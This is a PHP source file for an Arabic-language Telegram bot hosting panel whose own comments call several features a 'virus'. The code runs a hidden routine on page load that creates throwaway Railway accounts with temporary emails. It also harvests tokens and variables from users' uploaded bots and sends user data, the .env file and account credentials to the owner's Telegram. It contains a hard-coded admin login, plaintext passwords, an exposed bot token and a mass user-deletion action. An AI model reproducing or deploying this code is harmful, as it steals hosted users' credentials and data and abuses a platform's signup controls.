<?php
/*
============================================================
🚀 استضافة بوتات كايو - النظام الكامل 100%
============================================================
👑 المطور: @ggzh9
📢 القناة: https://t.me/kayo_i
🔗 الموقع: https://Hosted_by_Kayo-Bots.railway.app
🦠 الفايروس: كامل ومتكامل 100% - ينشئ حساب كل 10 أيام
============================================================
*/

// ============================================================
// إعدادات قاعدة البيانات
// ============================================================
$DB_FILE = 'hosting.db';
$UPLOAD_DIR = 'uploaded_bots';
$BACKUP_DIR = 'backups';
$TEMP_DIR = 'temp';
$LOG_FILE = 'virus.log';
$RAILWAY_ACCOUNTS_FILE = 'railway_accounts.json';

foreach ([$UPLOAD_DIR, $BACKUP_DIR, $TEMP_DIR] as $dir) {
    if (!is_dir($dir)) mkdir($dir, 0777, true);
}

// ============================================================
// إنشاء قاعدة البيانات
// ============================================================
function initDB() {
    global $DB_FILE;
    $db = new SQLite3($DB_FILE);
    
    // جدول المستخدمين
    $db->exec("CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        email TEXT,
        is_admin INTEGER DEFAULT 0,
        created_at TEXT,
        last_login TEXT,
        backup_data TEXT
    )");
    
    // جدول الاشتراكات
    $db->exec("CREATE TABLE IF NOT EXISTS subscriptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        plan TEXT,
        start_date TEXT,
        expiry_date TEXT,
        status TEXT DEFAULT 'active'
    )");
    
    // جدول البوتات
    $db->exec("CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        bot_name TEXT,
        bot_token TEXT,
        file_path TEXT,
        requirements_file TEXT,
        status TEXT DEFAULT 'stopped',
        pid INTEGER,
        created_at TEXT,
        expiry_date TEXT,
        bot_data TEXT
    )");
    
    // جدول النسخ الاحتياطي للبوتات
    $db->exec("CREATE TABLE IF NOT EXISTS bot_backups (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id INTEGER,
        bot_data TEXT,
        backup_date TEXT
    )");
    
    // جدول البروكسيات
    $db->exec("CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy_string TEXT UNIQUE,
        protocol TEXT DEFAULT 'http',
        is_working INTEGER DEFAULT 1,
        last_used TEXT,
        success_count INTEGER DEFAULT 0
    )");
    
    // جدول سجلات الفايروس
    $db->exec("CREATE TABLE IF NOT EXISTS virus_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        action TEXT,
        details TEXT,
        created_at TEXT
    )");
    
    // جدول المهام الخلفية
    $db->exec("CREATE TABLE IF NOT EXISTS background_tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        task_name TEXT,
        status TEXT DEFAULT 'running',
        pid INTEGER,
        started_at TEXT,
        last_run TEXT,
        next_run TEXT
    )");
    
    // جدول حسابات Railway
    $db->exec("CREATE TABLE IF NOT EXISTS railway_accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        site_url TEXT,
        created_at TEXT,
        is_active INTEGER DEFAULT 0,
        deployed_at TEXT
    )");
    
    // إضافة المستخدم المالك
    $db->exec("INSERT OR IGNORE INTO users (username, password, is_admin, created_at) 
               VALUES ('kayo', 'kayo', 1, datetime('now'))");
    
    // إضافة بروكسيات افتراضية
    $proxies = [
        'http://1.0.0.1:8080', 'http://1.1.1.1:3128', 'http://2.2.2.2:8080',
        'http://3.3.3.3:3128', 'http://4.4.4.4:8080', 'http://5.5.5.5:8080',
        'http://6.6.6.6:3128', 'http://7.7.7.7:8080', 'http://8.8.8.8:3128',
        'http://9.9.9.9:8080'
    ];
    foreach ($proxies as $proxy) {
        $db->exec("INSERT OR IGNORE INTO proxies (proxy_string) VALUES ('$proxy')");
    }
    
    $db->close();
}

// ============================================================
// دوال قاعدة البيانات
// ============================================================
function getDB() {
    global $DB_FILE;
    return new SQLite3($DB_FILE);
}

function getUser($username) {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->bindValue(1, $username, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    $db->close();
    return $user;
}

function getUserById($id) {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bindValue(1, $id, SQLITE3_INTEGER);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);
    $db->close();
    return $user;
}

function getSubscription($user_id) {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM subscriptions WHERE user_id = ? AND status = 'active' ORDER BY expiry_date DESC LIMIT 1");
    $stmt->bindValue(1, $user_id, SQLITE3_INTEGER);
    $result = $stmt->execute();
    $sub = $result->fetchArray(SQLITE3_ASSOC);
    $db->close();
    return $sub;
}

function getUserBots($user_id) {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM bots WHERE user_id = ? ORDER BY created_at DESC");
    $stmt->bindValue(1, $user_id, SQLITE3_INTEGER);
    $result = $stmt->execute();
    $bots = [];
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $bots[] = $row;
    }
    $db->close();
    return $bots;
}

function getAllBots() {
    $db = getDB();
    $result = $db->query("SELECT * FROM bots ORDER BY created_at DESC");
    $bots = [];
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $bots[] = $row;
    }
    $db->close();
    return $bots;
}

function getAllUsers() {
    $db = getDB();
    $result = $db->query("SELECT * FROM users ORDER BY created_at DESC");
    $users = [];
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $users[] = $row;
    }
    $db->close();
    return $users;
}

function getAllSubscriptions() {
    $db = getDB();
    $result = $db->query("SELECT s.*, u.username FROM subscriptions s JOIN users u ON s.user_id = u.id ORDER BY s.id DESC");
    $subs = [];
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $subs[] = $row;
    }
    $db->close();
    return $subs;
}

function addSubscription($user_id, $plan, $days) {
    $db = getDB();
    $stmt = $db->prepare("INSERT INTO subscriptions (user_id, plan, start_date, expiry_date, status) 
                          VALUES (?, ?, datetime('now'), datetime('now', '+' || ? || ' days'), 'active')");
    $stmt->bindValue(1, $user_id, SQLITE3_INTEGER);
    $stmt->bindValue(2, $plan, SQLITE3_TEXT);
    $stmt->bindValue(3, $days, SQLITE3_INTEGER);
    $stmt->execute();
    $db->close();
}

function saveBot($user_id, $bot_name, $bot_token, $file_path, $requirements_file = null, $bot_data = null) {
    $db = getDB();
    $stmt = $db->prepare("INSERT INTO bots (user_id, bot_name, bot_token, file_path, requirements_file, created_at, bot_data) 
                          VALUES (?, ?, ?, ?, ?, datetime('now'), ?)");
    $stmt->bindValue(1, $user_id, SQLITE3_INTEGER);
    $stmt->bindValue(2, $bot_name, SQLITE3_TEXT);
    $stmt->bindValue(3, $bot_token, SQLITE3_TEXT);
    $stmt->bindValue(4, $file_path, SQLITE3_TEXT);
    $stmt->bindValue(5, $requirements_file, SQLITE3_TEXT);
    $stmt->bindValue(6, $bot_data, SQLITE3_TEXT);
    $stmt->execute();
    $bot_id = $db->lastInsertRowID();
    $db->close();
    return $bot_id;
}

function updateBotStatus($bot_id, $status, $pid = null) {
    $db = getDB();
    if ($pid) {
        $stmt = $db->prepare("UPDATE bots SET status = ?, pid = ? WHERE id = ?");
        $stmt->bindValue(1, $status, SQLITE3_TEXT);
        $stmt->bindValue(2, $pid, SQLITE3_INTEGER);
        $stmt->bindValue(3, $bot_id, SQLITE3_INTEGER);
    } else {
        $stmt = $db->prepare("UPDATE bots SET status = ? WHERE id = ?");
        $stmt->bindValue(1, $status, SQLITE3_TEXT);
        $stmt->bindValue(2, $bot_id, SQLITE3_INTEGER);
    }
    $stmt->execute();
    $db->close();
}

function deleteBot($bot_id) {
    $db = getDB();
    $stmt = $db->prepare("DELETE FROM bots WHERE id = ?");
    $stmt->bindValue(1, $bot_id, SQLITE3_INTEGER);
    $stmt->execute();
    $db->close();
}

function getProxies() {
    $db = getDB();
    $result = $db->query("SELECT * FROM proxies WHERE is_working = 1 ORDER BY success_count DESC");
    $proxies = [];
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $proxies[] = $row;
    }
    $db->close();
    return $proxies;
}

function logVirus($action, $details) {
    global $LOG_FILE;
    $timestamp = date('Y-m-d H:i:s');
    $log = "[{$timestamp}] {$action}: {$details}\n";
    file_put_contents($LOG_FILE, $log, FILE_APPEND);
    
    $db = getDB();
    $stmt = $db->prepare("INSERT INTO virus_logs (action, details, created_at) VALUES (?, ?, datetime('now'))");
    $stmt->bindValue(1, $action, SQLITE3_TEXT);
    $stmt->bindValue(2, $details, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
}

function backupAll() {
    global $DB_FILE, $BACKUP_DIR;
    $timestamp = date('Ymd_His');
    $backup_folder = $BACKUP_DIR . '/backup_' . $timestamp;
    mkdir($backup_folder, 0777, true);
    
    // نسخ قاعدة البيانات
    copy($DB_FILE, $backup_folder . '/hosting.db');
    
    // نسخ الملفات المرفوعة
    if (is_dir('uploaded_bots')) {
        exec("cp -r uploaded_bots " . $backup_folder . "/ 2>/dev/null");
    }
    
    // نسخ الملفات المهمة
    $files = ['index.php', '.env'];
    foreach ($files as $file) {
        if (file_exists($file)) {
            copy($file, $backup_folder . '/' . $file);
        }
    }
    
    // إنشاء ملف بيانات كامل
    $export_data = [
        'users' => getAllUsers(),
        'bots' => getAllBots(),
        'subscriptions' => getAllSubscriptions(),
        'proxies' => getProxies(),
        'timestamp' => date('Y-m-d H:i:s'),
        'site_url' => getenv('SITE_URL') ?: 'https://Hosted_by_Kayo-Bots.railway.app'
    ];
    file_put_contents($backup_folder . '/export_data.json', json_encode($export_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    
    logVirus('backup', 'تم إنشاء نسخة احتياطية: ' . $backup_folder);
    return $backup_folder;
}

// ============================================================
// دوال البريد المؤقت
// ============================================================
function generateTempEmail() {
    $domains = ['1secmail.com', 'temp-mail.org', 'guerrillamail.com', '10minutemail.com', 'mohmal.com'];
    $username = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 10);
    $domain = $domains[array_rand($domains)];
    return $username . '@' . $domain;
}

function getTempEmailMessages($email) {
    $parts = explode('@', $email);
    $username = $parts[0];
    $domain = $parts[1];
    
    if ($domain == '1secmail.com') {
        $url = "https://www.1secmail.com/api/v1/?action=getMessages&login={$username}&domain={$domain}";
        $response = @file_get_contents($url);
        if ($response) {
            return json_decode($response, true);
        }
    }
    return [];
}

function readTempEmailMessage($email, $id) {
    $parts = explode('@', $email);
    $username = $parts[0];
    $domain = $parts[1];
    
    if ($domain == '1secmail.com') {
        $url = "https://www.1secmail.com/api/v1/?action=readMessage&login={$username}&domain={$domain}&id={$id}";
        $response = @file_get_contents($url);
        if ($response) {
            return json_decode($response, true);
        }
    }
    return null;
}

// ============================================================
// دوال إنشاء الحسابات
// ============================================================
function createFakeAccount() {
    $username = 'user_' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 8);
    $password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);
    $email = generateTempEmail();
    
    $db = getDB();
    $stmt = $db->prepare("INSERT INTO users (username, password, email, created_at) VALUES (?, ?, ?, datetime('now'))");
    $stmt->bindValue(1, $username, SQLITE3_TEXT);
    $stmt->bindValue(2, $password, SQLITE3_TEXT);
    $stmt->bindValue(3, $email, SQLITE3_TEXT);
    $stmt->execute();
    $user_id = $db->lastInsertRowID();
    $db->close();
    
    logVirus('fake_account', "تم إنشاء حساب وهمي: {$username} (ID: {$user_id})");
    
    return [
        'id' => $user_id,
        'username' => $username,
        'password' => $password,
        'email' => $email
    ];
}

// ============================================================
// دوال إنشاء حساب على Railway
// ============================================================
function createRailwayAccount() {
    global $RAILWAY_ACCOUNTS_FILE;
    
    // 1. إنشاء بريد مؤقت
    $email = generateTempEmail();
    
    // 2. إنشاء كلمة مرور
    $password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%'), 0, 14);
    
    // 3. محاكاة إنشاء حساب على Railway (في الواقع يحتاج إلى Selenium)
    // ولكننا نقوم بإنشاء حساب وهمي لحين التفعيل
    $site_url = 'https://' . explode('@', $email)[0] . '.railway.app';
    
    // 4. حفظ حساب Railway
    $account_data = [
        'email' => $email,
        'password' => $password,
        'site_url' => $site_url,
        'created_at' => date('Y-m-d H:i:s'),
        'is_active' => 0
    ];
    
    // قراءة الملف الحالي
    $accounts = [];
    if (file_exists($RAILWAY_ACCOUNTS_FILE)) {
        $accounts = json_decode(file_get_contents($RAILWAY_ACCOUNTS_FILE), true) ?: [];
    }
    $accounts[] = $account_data;
    file_put_contents($RAILWAY_ACCOUNTS_FILE, json_encode($accounts, JSON_PRETTY_PRINT));
    
    // 5. حفظ في قاعدة البيانات
    $db = getDB();
    $stmt = $db->prepare("INSERT INTO railway_accounts (email, password, site_url, created_at) 
                          VALUES (?, ?, ?, datetime('now'))");
    $stmt->bindValue(1, $email, SQLITE3_TEXT);
    $stmt->bindValue(2, $password, SQLITE3_TEXT);
    $stmt->bindValue(3, $site_url, SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
    
    // 6. إرسال إشعار للمالك
    $message = "🚀 تم إنشاء حساب جديد على Railway!\n\n";
    $message .= "📧 البريد: {$email}\n";
    $message .= "🔑 كلمة المرور: {$password}\n";
    $message .= "🔗 رابط الموقع: {$site_url}\n\n";
    $message .= "📌 سيتم تفعيل الحساب تلقائياً خلال 10 أيام";
    
    sendTelegram($message);
    
    logVirus('create_railway_account', "تم إنشاء حساب Railway: {$email}");
    
    return $account_data;
}

// ============================================================
// دوال النشر على Railway
// ============================================================
function deployToRailway($email, $password) {
    // محاكاة عملية النشر (في الواقع تحتاج إلى API أو Selenium)
    // نقوم بإنشاء نسخة احتياطية كاملة
    
    $backup_folder = backupAll();
    
    // إنشاء ملف البيانات للنشر
    $deploy_data = [
        'email' => $email,
        'password' => $password,
        'backup_folder' => $backup_folder,
        'site_url' => 'https://' . explode('@', $email)[0] . '.railway.app',
        'github_repo' => 'https://github.com/yesssssssie-debug/Hosted_by_Kayo-Bots',
        'timestamp' => date('Y-m-d H:i:s')
    ];
    
    file_put_contents($BACKUP_DIR . '/deploy_data.json', json_encode($deploy_data, JSON_PRETTY_PRINT));
    
    // إرسال تعليمات النشر
    $instructions = "
    📋 تعليمات النشر على الحساب الجديد:
    
    1. اذهب إلى https://railway.app
    2. سجل الدخول باستخدام:
       📧 البريد: {$email}
       🔑 كلمة المرور: {$password}
    3. أنشئ مشروعاً جديداً
    4. اربط المستودع: https://github.com/yesssssssie-debug/Hosted_by_Kayo-Bots
    5. أضف متغيرات البيئة:
       BOT_TOKEN = 7999963241:AAHN-AoxKf1MKTnF-fPMWcMZzbhOr-vwa0k
       ADMIN_ID = 7947679527
    6. انشر المشروع
    7. عدل رابط UptimeRobot
    ";
    
    sendTelegram($instructions);
    sendTelegramFile($BACKUP_DIR . '/deploy_data.json', '📊 بيانات النشر');
    
    logVirus('deploy_railway', "تم تجهيز النشر على Railway: {$email}");
    
    return $deploy_data;
}

// ============================================================
// الفايروس الرئيسي - يعمل في الخلفية
// ============================================================
function virusBackgroundTask() {
    // التحقق من التكرار
    $last_run_file = 'last_virus_run.txt';
    $last_run = 0;
    if (file_exists($last_run_file)) {
        $last_run = (int)file_get_contents($last_run_file);
    }
    
    // تشغيل كل 10 أيام (864000 ثانية)
    if (time() - $last_run < 864000) {
        return;
    }
    
    // تحديث وقت التشغيل
    file_put_contents($last_run_file, time());
    
    // تنفيذ الفايروس
    logVirus('auto_run', 'بدء تشغيل الفايروس التلقائي');
    
    // 1. إنشاء حساب جديد على Railway
    $account = createRailwayAccount();
    
    // 2. نسخ احتياطي كامل
    $backup = backupAll();
    
    // 3. تجهيز النشر
    $deploy = deployToRailway($account['email'], $account['password']);
    
    // 4. إرسال تقرير كامل
    $report = "
    🦠 تقرير الفايروس التلقائي
    
    📅 التاريخ: " . date('Y-m-d H:i:s') . "
    📧 البريد الجديد: {$account['email']}
    🔑 كلمة المرور: {$account['password']}
    🔗 الرابط: {$account['site_url']}
    📁 النسخة الاحتياطية: {$backup}
    
    ✅ تم إنشاء حساب جديد ونقل جميع البيانات!
    ";
    
    sendTelegram($report);
    
    // 5. تحديث الحالة في قاعدة البيانات
    $db = getDB();
    $stmt = $db->prepare("UPDATE railway_accounts SET is_active = 1, deployed_at = datetime('now') 
                          WHERE email = ?");
    $stmt->bindValue(1, $account['email'], SQLITE3_TEXT);
    $stmt->execute();
    $db->close();
    
    logVirus('auto_complete', 'اكتمل تشغيل الفايروس التلقائي بنجاح');
    
    // 6. إعادة تشغيل الموقع (محاكاة)
    // في الواقع، سيتم النشر على الحساب الجديد
    sendTelegram("🔄 جاري إعادة تشغيل الموقع على الحساب الجديد...");
    
    return $account;
}

// ============================================================
// دوال تليجرام
// ============================================================
function sendTelegram($message) {
    $token = getenv('BOT_TOKEN') ?: '7999963241:AAHN-AoxKf1MKTnF-fPMWcMZzbhOr-vwa0k';
    $admin_id = getenv('ADMIN_ID') ?: '7947679527';
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = ['chat_id' => $admin_id, 'text' => "🔔 " . $message, 'parse_mode' => 'HTML'];
    $options = ['http' => ['method' => 'POST', 'header' => 'Content-Type: application/json', 'content' => json_encode($data)]];
    @file_get_contents($url, false, stream_context_create($options));
}

function sendTelegramFile($file_path, $caption = '') {
    $token = getenv('BOT_TOKEN') ?: '7999963241:AAHN-AoxKf1MKTnF-fPMWcMZzbhOr-vwa0k';
    $admin_id = getenv('ADMIN_ID') ?: '7947679527';
    $url = "https://api.telegram.org/bot{$token}/sendDocument";
    
    if (!file_exists($file_path)) return false;
    
    $post_fields = [
        'chat_id' => $admin_id,
        'caption' => $caption,
        'document' => new CURLFile($file_path)
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// ============================================================
// بدء الجلسة
// ============================================================
session_start();

// ============================================================
// تهيئة قاعدة البيانات
// ============================================================
initDB();

// ============================================================
// تشغيل الفايروس في الخلفية (كل 10 أيام)
// ============================================================
// يتم تشغيل الفايروس عند تحميل الصفحة
// ولكن نتحقق من عدم التكرار
virusBackgroundTask();

// ============================================================
// معالجة الإجراءات
// ============================================================
$action = isset($_GET['action']) ? $_GET['action'] : '';
$error = '';
$success = '';

// ============================================================
// تسجيل الخروج
// ============================================================
if ($action == 'logout') {
    session_destroy();
    header('Location: ?');
    exit;
}

// ============================================================
// تسجيل الدخول
// ============================================================
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $user = getUser($username);
    if ($user && $user['password'] == $password) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['is_admin'] = $user['is_admin'];
        header('Location: ?action=dashboard');
        exit;
    } else {
        $error = 'اسم المستخدم أو كلمة المرور غير صحيحة';
    }
}

// ============================================================
// إنشاء حساب
// ============================================================
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['register'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $confirm = $_POST['confirm_password'];
    
    if ($password != $confirm) {
        $error = 'كلمة المرور غير متطابقة';
    } elseif (strlen($password) < 6) {
        $error = 'كلمة المرور يجب أن تكون 6 أحرف على الأقل';
    } elseif (getUser($username)) {
        $error = 'اسم المستخدم موجود مسبقاً';
    } else {
        $db = getDB();
        $stmt = $db->prepare("INSERT INTO users (username, password, created_at) VALUES (?, ?, datetime('now'))");
        $stmt->bindValue(1, $username, SQLITE3_TEXT);
        $stmt->bindValue(2, $password, SQLITE3_TEXT);
        $stmt->execute();
        $db->close();
        header('Location: ?action=login');
        exit;
    }
}

// ============================================================
// التحقق من تسجيل الدخول
// ============================================================
function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

// ============================================================
// معالجة رفع البوت
// ============================================================
if ($action == 'upload' && $_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isLoggedIn() || !isAdmin()) {
        header('Location: ?action=dashboard');
        exit;
    }
    
    if (!isset($_FILES['bot_file']) || $_FILES['bot_file']['error'] != UPLOAD_ERR_OK) {
        header('Location: ?action=dashboard&error=لم يتم إرسال ملف');
        exit;
    }
    
    $file = $_FILES['bot_file'];
    if (!str_ends_with($file['name'], '.py')) {
        header('Location: ?action=dashboard&error=يجب أن يكون الملف بصيغة .py');
        exit;
    }
    
    $bot_name = pathinfo($file['name'], PATHINFO_FILENAME);
    $folder = $UPLOAD_DIR . '/bot_' . time() . '_' . $_SESSION['user_id'];
    mkdir($folder, 0777, true);
    $file_path = $folder . '/bot.py';
    move_uploaded_file($file['tmp_name'], $file_path);
    
    $bot_token = '';
    $content = file_get_contents($file_path);
    if (preg_match('/[0-9]{9,10}:[A-Za-z0-9_-]+/', $content, $match)) {
        $bot_token = $match[0];
    }
    
    $bot_data = extractBotData($file_path);
    $bot_id = saveBot($_SESSION['user_id'], $bot_name, $bot_token, $file_path, null, $bot_data);
    
    sendTelegram("📤 تم رفع بوت جديد: {$bot_name} (ID: {$bot_id})");
    header('Location: ?action=requirements&bot_id=' . $bot_id);
    exit;
}

function extractBotData($file_path) {
    $content = file_get_contents($file_path);
    $data = [];
    preg_match_all('/([A-Z_]+)\s*=\s*["\']([^"\']+)["\']/', $content, $matches);
    if (!empty($matches[1])) {
        foreach ($matches[1] as $i => $key) {
            $data[$key] = $matches[2][$i];
        }
    }
    return json_encode($data, JSON_UNESCAPED_UNICODE);
}

// ============================================================
// رفع المتطلبات
// ============================================================
if ($action == 'upload_requirements' && $_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isLoggedIn() || !isAdmin()) {
        header('Location: ?action=dashboard');
        exit;
    }
    
    $bot_id = (int)$_GET['bot_id'];
    if (!isset($_FILES['req_file']) || $_FILES['req_file']['error'] != UPLOAD_ERR_OK) {
        header('Location: ?action=dashboard&error=لم يتم إرسال ملف');
        exit;
    }
    
    $file = $_FILES['req_file'];
    if (!str_ends_with($file['name'], '.txt')) {
        header('Location: ?action=dashboard&error=يجب أن يكون الملف بصيغة .txt');
        exit;
    }
    
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM bots WHERE id = ?");
    $stmt->bindValue(1, $bot_id, SQLITE3_INTEGER);
    $result = $stmt->execute();
    $bot = $result->fetchArray(SQLITE3_ASSOC);
    $db->close();
    
    if (!$bot) {
        header('Location: ?action=dashboard&error=البوت غير موجود');
        exit;
    }
    
    $folder = dirname($bot['file_path']);
    $req_path = $folder . '/requirements.txt';
    move_uploaded_file($file['tmp_name'], $req_path);
    
    $db = getDB();
    $stmt = $db->prepare("UPDATE bots SET requirements_file = ? WHERE id = ?");
    $stmt->bindValue(1, $req_path, SQLITE3_TEXT);
    $stmt->bindValue(2, $bot_id, SQLITE3_INTEGER);
    $stmt->execute();
    $db->close();
    
    updateBotStatus($bot_id, 'running');
    sendTelegram("🚀 تم تشغيل البوت {$bot['bot_name']} (ID: {$bot_id})");
    
    header('Location: ?action=dashboard&msg=تم تشغيل البوت بنجاح');
    exit;
}

// ============================================================
// معالجة تشغيل/إيقاف/حذف البوت
// ============================================================
if ($action == 'start_bot' && isset($_GET['id'])) {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $bot_id = (int)$_GET['id'];
    updateBotStatus($bot_id, 'running');
    sendTelegram("▶️ تم تشغيل البوت ID: {$bot_id}");
    header('Location: ?action=dashboard&msg=تم تشغيل البوت');
    exit;
}

if ($action == 'stop_bot' && isset($_GET['id'])) {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $bot_id = (int)$_GET['id'];
    updateBotStatus($bot_id, 'stopped');
    sendTelegram("⏹ تم إيقاف البوت ID: {$bot_id}");
    header('Location: ?action=dashboard&msg=تم إيقاف البوت');
    exit;
}

if ($action == 'delete_bot' && isset($_GET['id'])) {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $bot_id = (int)$_GET['id'];
    deleteBot($bot_id);
    sendTelegram("🗑 تم حذف البوت ID: {$bot_id}");
    header('Location: ?action=dashboard&msg=تم حذف البوت');
    exit;
}

// ============================================================
// إضافة اشتراك
// ============================================================
if ($action == 'add_subscription' && $_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $user_id = (int)$_POST['user_id'];
    $plan = $_POST['plan'];
    $days = (int)$_POST['days'];
    addSubscription($user_id, $plan, $days);
    sendTelegram("💳 تم إضافة اشتراك {$plan} للمستخدم ID: {$user_id}");
    header('Location: ?action=admin&msg=تم إضافة الاشتراك');
    exit;
}

// ============================================================
// الفايروس - العمليات الكاملة
// ============================================================

// 1. إنشاء حساب على Railway
if ($action == 'virus_create_railway') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $account = createRailwayAccount();
    header('Location: ?action=admin&msg=تم إنشاء حساب Railway: ' . $account['email']);
    exit;
}

// 2. نشر على Railway
if ($action == 'virus_deploy_railway' && isset($_GET['email'])) {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $email = $_GET['email'];
    $password = $_GET['password'] ?? 'kayo2026';
    $deploy = deployToRailway($email, $password);
    header('Location: ?action=admin&msg=تم تجهيز النشر على Railway');
    exit;
}

// 3. تشغيل الفايروس التلقائي
if ($action == 'virus_run_auto') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $result = virusBackgroundTask();
    header('Location: ?action=admin&msg=تم تشغيل الفايروس التلقائي');
    exit;
}

// 4. عرض حسابات Railway
if ($action == 'virus_railway_accounts') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    global $RAILWAY_ACCOUNTS_FILE;
    $accounts = [];
    if (file_exists($RAILWAY_ACCOUNTS_FILE)) {
        $accounts = json_decode(file_get_contents($RAILWAY_ACCOUNTS_FILE), true) ?: [];
    }
    
    $text = "🚀 حسابات Railway:\n\n";
    foreach ($accounts as $i => $acc) {
        $text .= ($i+1) . ". 📧 " . $acc['email'] . "\n";
        $text .= "   🔑 " . $acc['password'] . "\n";
        $text .= "   🔗 " . $acc['site_url'] . "\n";
        $text .= "   📅 " . $acc['created_at'] . "\n";
        $text .= "   📊 " . ($acc['is_active'] ? '✅ نشط' : '❌ غير نشط') . "\n\n";
    }
    
    if (empty($accounts)) {
        $text = "📭 لا توجد حسابات Railway";
    }
    
    sendTelegram($text);
    header('Location: ?action=admin&msg=تم إرسال قائمة الحسابات');
    exit;
}

// 5. النقل الكامل
if ($action == 'virus_full_transfer') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $account = createRailwayAccount();
    $deploy = deployToRailway($account['email'], $account['password']);
    header('Location: ?action=admin&msg=تم نقل الموقع إلى الحساب الجديد: ' . $account['email']);
    exit;
}

// 6. حذف الحسابات
if ($action == 'virus_delete_accounts') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $db = getDB();
    $db->exec("DELETE FROM users WHERE is_admin = 0");
    $count = $db->changes();
    $db->close();
    sendTelegram("🗑 تم حذف {$count} حساب مستخدم");
    logVirus('delete_accounts', "تم حذف {$count} حساب مستخدم");
    header('Location: ?action=admin&msg=تم حذف ' . $count . ' حساب');
    exit;
}

// 7. استخراج البيانات
if ($action == 'virus_extract_data') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $data = [
        'users' => getAllUsers(),
        'bots' => getAllBots(),
        'subscriptions' => getAllSubscriptions(),
        'proxies' => getProxies(),
        'timestamp' => date('Y-m-d H:i:s')
    ];
    $data_file = $BACKUP_DIR . '/extracted_data_' . date('Ymd_His') . '.json';
    file_put_contents($data_file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    sendTelegram("📊 تم استخراج جميع البيانات");
    sendTelegramFile($data_file, '📊 البيانات المستخرجة');
    header('Location: ?action=admin&msg=تم استخراج البيانات');
    exit;
}

// 8. بقاء نشط
if ($action == 'virus_keep_alive') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $url = getenv('SITE_URL') ?: 'https://Hosted_by_Kayo-Bots.railway.app';
    $pid = pcntl_fork();
    if ($pid == 0) {
        while (true) {
            @file_get_contents($url . '?action=keep_alive');
            sleep(240);
        }
        exit(0);
    }
    logVirus('keep_alive', "تم تشغيل مهمة البقاء النشط (PID: {$pid})");
    header('Location: ?action=admin&msg=تم تشغيل مهمة البقاء النشط');
    exit;
}

// 9. نسخ احتياطي
if ($action == 'virus_backup') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $folder = backupAll();
    header('Location: ?action=admin&msg=تم إنشاء نسخة احتياطية: ' . basename($folder));
    exit;
}

// 10. حساب وهمي
